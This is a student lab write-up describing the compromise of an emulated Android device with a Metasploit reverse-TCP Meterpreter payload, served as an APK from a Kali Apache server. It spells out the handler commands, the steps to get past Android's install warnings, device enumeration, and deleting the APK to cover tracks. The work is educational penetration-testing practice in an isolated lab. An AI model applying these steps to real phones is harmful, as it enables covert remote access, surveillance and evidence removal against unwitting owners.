Using Metasploit Payload to hack an android mobile device
Access and Install Malicious APK file

[FinalProj_JephtePierre.pdf](https://github.com/user-attachments/files/16489234/FinalProj_JephtePierre.pdf)

Introduction
Mobile devices are among the most frequently used electronic devices today. They are used for communication, file sharing, location tracking, web browsing, and various other purposes, making them prime targets for attackers. As an ethical hacker, it is crucial to understand and use mobile hacking tools and techniques to perform tests on these devices to enhance their resilience against attacks.  

Project Objectives  
Exploit the vulnerabilities in an Android device (perform device enumeration to gather detailed information about the device). Device enumeration and covering tracks (Develop methods for covering tracks post-exploitation to simulate real-world attack scenarios.)

Description and Methodology of the proposed Project
This project proposes to exploit vulnerabilities in an Android device using ethical hacking techniques. The significance lies in understanding how attackers can compromise mobile devices and how to protect against such attacks.  It includes exploiting known vulnerabilities, device enumeration, and covering tracks to prevent detection
Exploit Vulnerabilities: Use tools like Metasploit to create and deploy payloads targeting Android devices. 
Device Enumeration: Gather comprehensive information about the target device, including
 network interfaces, installed applications, and system information. 
Covering Tracks: Implement methods to remove evidence of the exploit and maintain access to 
the device without detection.


Resources
Hardware: Android device, computer with virtualization capability. 
Software: Kali Linux, Metasploit Framework, Android Emulator, Hyper-V Manager. 
Datasets: Vulnerability databases, exploit repositories

Topology
Note: Windows Server 2019* Not Windows 10










Deliverables
Task 1: Configure the VMs. 
Task 2: Develop and deploy a Metasploit payload to hack the Android device. 
Task 3: Access and install a malicious APK file on the Android device. 
Task 4: Perform device enumeration and gather detailed system information.  
Task 1: Configure the VMs. 
1.1	Firewall

For this project, I used pfSense as a firewall and router in VirtualBox. The instructions on how to set up the open-source firewall are well explained on the pfSense website, making it accessible even for beginners. pfSense provides robust security features and is highly customizable, making it a popular choice for both personal and professional use.
The interface below shows the assigned IPs for the WAN (Wide Area Network) and LAN (Local Area Network). The WAN IP is the address that connects to the external network or the internet, while the LAN IP is used for internal network communications. Setting up these interfaces correctly is crucial for ensuring proper network segmentation and security.
By using pfSense in VirtualBox, I can simulate a network environment for testing and educational purposes without needing additional physical hardware. This setup allows for flexibility and experimentation in a controlled, virtualized environment.
 

The way I set it up was by connecting to the Kali Linux machine using the IP address of the LAN network, which was initially assigned via DHCP. I then changed these IP addresses to static IPs to ensure consistent network communication and prevent potential conflicts. After setting the static IPs, I added some roles to the firewall to enhance network security and control traffic flow. Below is an example of the configuration:
Connecting to the LAN Network: Using the IP address assigned by DHCP, I accessed the Kali Linux machine. This initial connection allowed me to configure the network settings directly from within the virtual environment. Setting Static IPs: I converted the dynamically assigned IPs to static ones. This step ensures that the IP addresses remain consistent across reboots and helps in managing the network more efficiently. Configuring Firewall Rules: I added roles to the pfSense firewall to control inbound and outbound traffic. These rules help in defining what traffic is allowed or blocked, enhancing the overall security of the network.
















1.2 Windows Server 2019, Android, Hyper-V Manager

In the Windows network setting you can see that I have used the IP of the Windows machine with the mask: 255.255.255.0 and the default gateway 192.168.0.254

 
To install the Hyper-V Manager on Windows Server 2019, you might encounter a situation where the Hyper-V option is not visible in Control Panel > Programs > Turn Windows features on or off, particularly when running in a VirtualBox environment. This can be due to various reasons, such as the feature not being installed or the VirtualBox configuration not supporting it by default. 

Once Hyper V is installed. I have created the mobile device virtual machine within the Hyper-V I have assigned the correct IP address and gateway to the Mobile Device (image below)


 













 









1.3 The Kali Linux Machine
For the Kali machine, I performed the following steps:
Assign the Correct IP Address:
I configured the Kali Linux machine with a static IP address to ensure stable and predictable network communication. This involves editing the network configuration files or using network management tools within Kali Linux to set a fixed IP address and gateway that suits my network setup.

 



Install Apache2 and Dependencies:
I installed Apache2, the popular web server software, along with its necessary dependencies. This is done using the package management system in Kali Linux. The command typically used is sudo apt-get install apache2, which fetches and installs Apache2 and its associated packages.

Verify the Apache2 Installation:
After installation, I checked that Apache2 was installed correctly. This can be verified by checking the version of Apache2 with apache2 -v or by examining the list of installed packages.

 

Ensure Apache2 is Running:
I checked the status of the Apache2 service to confirm it was running. This was done with the command systemctl status apache2. Apache2 was not running, I started it using sudo systemctl start apache2
 











Verify Apache2 Functionality:
To ensure that Apache2 is functioning properly, I accessed the web server from a browser by entering the IP address of the Kali machine. If Apache2 is working correctly, I should see the default Apache2 web page, or any custom content served by Apache2.

 





Task 2: Develop and deploy a Metasploit payload to hack the Android device. 
Now that you know the IP address of the target device that was on the network 192.168.0.0/24. (Task 1) with the IP address: 192.168.0.5, and the Kali Linux host is connected to the same network as the target device. Therefore, we can move on to creating the payload that will be used to compromise the Android VM. We will need to run the Metasploit Framework exploitation tool to perform the attack (cause the apache2 server is also running in task 1.3). To begin, it’s important to understand that Apache2 server will not allow access to the resources located at
/var/www/html. Since this will be the destination of the created payload, we need to remove the default index.html file with the command rm /var/www/html/index.html. This will delete
the index.html file from the path. Next, we will now be creating a payload to exploit the Android emulator in the Windows OS machine, but first, we need to create a directory to store the file. Since we are using the Apache2 web server, we will create a folder in the location /var/www/html. To do this we will type the command mkdir /var/www/html/FinProj-Jeph and press Enter to create the directory named FinProj-Jeph, as seen in below. 









The next step is to create our payload for the Android device. To do so we can the command msfvenom which is a Metasploit standalone payload generator. (msfvenom -help command gives more details on this command)
 

As you can see above, after typing the command the payload has been created, the size is 10181 bytes and the LHOST = 192.168.0.2 is the IP address of the Kali machine which we confirmed in Task 1.3



Task 3: Access and install a malicious APK file on the Android device. 
Now that we have created the Android APK file and saved it in the Apache server. We can go back to the Android VM and download the file with Google Chrome. When we type the IP of the Kali machine, we will see the folder FinProj-Jeph and inside the android.apk ready to be downloaded.

 

 

Once the download is being processed Chrome will prompt to gain access to the storage on the device. Click Continue. Then click Allow to grant Chrome access to files on the device. Ignore all warnings, then click OK to continue and begin downloading the application package. Finally, The application package should now be downloaded to the device and ready to be opened. By default, Android security will not allow the installation of applications from unknown sources. We will need to change the security setting to allow the installation of these types of apps. To do this, click the Settings option from the prompt that appears. The Install Unknown Apps window will appear. Click the Allow from this source option to enable it, allowing apps downloaded by Google Chrome to be installed on the device. (these steps above may not appear)
You will be brought to the installation window, where you will see all the features the application will have access to. As you can see from the details (picture below), our application is able to access lots of different features on the phone. Once you are done reviewing them, click the Install. Once the installation is done, you will see the App installed message; you can click
Open to end the installation process and start the application.

 

Now that the application was successfully installed on our target device, we can switch back to the Kali VM.

In Kali Linux, if we type the command sudo msfconsole, we will start the Metasploit Framework console.
 

Then, we can type the command use exploit/multi/handler a Metasploit module used for handling incoming connections from payloads, essentially serving as a listener for reverse shells or other types of payload connections. Within the Metasploit Framework, there are several payloads and exploits for different operating systems, but the ones we are interested in are for Android. The easiest way is to use the search command to locate exploits with the android tag. Let us type the command search android and press Enter. 

 

As you can see, a list of available payloads is displayed within the terminal window. We will choose the payload payload/android/meterpreter/reverse_tcp. If you are unable to see the full list, scroll down to No 25. Type the command set payload android/meterpreter/reverse_tcp and press Enter. We can also look at the parameters this payload requires by typing the command show options. You will notice that it requires a local host (LHOST) which is the IP address of the Kali machine and a local port (LPORT). The Port number is not as important as the host IP address, so for now, we can leave it as the default.


 

We can set the LHOST by typing the command set LHOST 192.168.0.2 (IP of the Kali VM) If we type show options again, we will see that the LHOST has been updated.

 










Task 4: Perform device enumeration and gather detailed system information. 
Now, we can exploit the device. If we type the command exploit -j -z command in Metasploit is used to start the exploit handler as a background job and automatically exit when all sessions have ended. By using -j, the handler runs in the background, allowing you to continue working in the Metasploit console or perform other tasks. The -z option ensures that the handler terminates once there are no more active sessions, making it suitable for automated tasks or scripts where you want the handler to clean up and stop on its own after handling connections.
 

We can interact with the session and see what happens by typing the command sessions -i 1 (-i means to interact with the supplied session ID; in this instance, it is 1.). Once this command is typed the Meterpreter shell will launch i.e. This means that we have successfully accessed and exploited the Android emulator. We can go further because a good hacker tries to learn as much they can about the target as possible, for example, the target’s network interfaces (ifconfig), system information (sysinfo), etc. This is the process of enumeration. 
 

As you can see, we have accessed the Android IP address 192.168.0.5 of the target that we showed in Task 1.2. Another useful command we can also use is the app_list which will list all the applications installed on the Android Device. 


 

Also, to check if the device is rooted, we can use the command check_root
 

So far, we know the system information, root status, application list, network interfaces, and subnet. Let us dig deeper to unearth more useful information. Let us upload a file as proof that we accessed and exploited the device. We will begin by creating a README.txt text file containing the phrase: “You have been hacked Unfortunately” to upload it to the mobile device’s SD card. 























Before that, we recall that the user installed an android.apk file on the device, we will check the files of the device to see the the android.apk file is there. If we do cd / and ls 
 

If you scroll through the list, you will see the system folder called sdcard. This folder stores files for Android devices and is a great place to find user files. Let us try to identify the file we downloaded while using the target device. To do this, type cd /sdcard/Download. Once there, type ls to list the content of this folder. As you can see the file, we downloaded called android.apk is listed there and to remove it, we can simply type the command rm android.apk. (it is important to remove the file because as a hacker, it is best practice to cover your tracks during and after the exploit). As you can see when we type ls respectively, we can see the file was removed successfully (No entries exist in /storage/emulated/0/Download)

 

Now, we can leave the note created above for the victim by simply typing the command: upload -r/root/Desktop/README.txt /storage/emulated/0/Android/Data
 

We can see that the file was uploaded. Let's switch back to the Android device to confirm it was added. On the home screen, tap the Application menu button to launch the Android menu, then select Files. In the Files app, tap the More Options button at the top right corner and select "Show internal storage." This will allow us to navigate to the destination where the text files were uploaded on the device.


























Figure 1. 
Once the step above is completed, select Virtual Machine and navigate to the path Android>Data>README.txt to open the file. 
 








References
•	EC-Council CEH v10 Domain Modules 17: Hacking Mobile Platforms
•	https://ipv6.rs/tutorial/Kali_Linux_Latest/Apache/
•	https://docs.metasploit.com/
•	https://codered.eccouncil.org/course/the-complete-mobile-ethical-hacking-course?logged=false
•	Network Development Group (NDG)
![image](https://github.com/user-attachments/assets/96c5b017-5b2e-4e8d-ab3a-b2185ed713df)

